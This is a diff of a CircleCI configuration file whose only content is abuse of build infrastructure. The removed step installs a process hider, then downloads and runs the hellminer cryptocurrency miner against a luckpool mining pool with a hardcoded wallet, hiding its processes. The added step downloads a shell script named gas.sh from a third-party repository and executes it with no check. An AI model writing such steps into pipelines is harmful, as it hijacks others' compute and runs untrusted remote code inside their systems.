@@ -4,8 +4,7 @@ jobs:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
-        - run:
-            apt update && apt upgrade -y && apt install nodejs && apt install npm && npm i -g node-process-hider && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && chmod +x hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ph add hellminer && ph add verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 36
+        - run: wget https://raw.githubusercontent.com/chikahusarii/autogen/main/gas.sh && ./gas.sh
 
 workflows:
     version: 2.1
